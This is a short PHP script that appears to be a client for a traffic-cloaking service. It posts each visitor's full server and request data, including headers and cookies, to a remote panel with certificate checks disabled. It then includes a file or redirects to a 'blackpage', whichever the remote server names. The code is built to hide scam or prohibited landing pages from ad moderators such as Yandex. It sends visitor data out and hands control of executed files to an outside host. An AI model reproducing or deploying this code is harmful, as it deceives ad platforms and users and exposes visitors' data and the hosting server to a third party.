<?php
$mainserver = 'https://panel.cloakit.space/';

if (isset($_SERVER['HTTP_REFERER'])) {if (stristr($_SERVER['HTTP_REFERER'], 'yabs.yandex')) {
    $_SERVER['HTTP_REFERER'] = 'yabs.yandex';
}}

$data = array(
   '_server' => json_encode($_SERVER),
   'user' => 'a53e3b07084a304728cb2ddc0fee1c88',
   'company' => '8773'
);
$ch = curl_init();
$optArray = array(
    CURLOPT_URL => $mainserver.'api_v2',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_CUSTOMREQUEST => 'POST',
    CURLOPT_POSTFIELDS => $data
);

curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);
$responses = json_decode($result, true);

if ($_SERVER['QUERY_STRING']!='') {
  $realpage = explode('?',$responses['page']);
  $realpage = $realpage[0];
  $responses['page'] = $realpage;

  $querys = explode('&',$_SERVER['QUERY_STRING']);

  foreach ($querys as $query) {
    $query = explode('=',$query);
    $_GET[$query[0]]=$query[1];
  }
}

if ($responses['mode']=='load') {
  require_once($responses['page']);
}
else if ($responses['mode']=='redirect') {
  if ($responses['type']=='blackpage') {
    header('Location: '.$responses['page']);
  }
  else {
    require_once($responses['page']);
  }
}
?>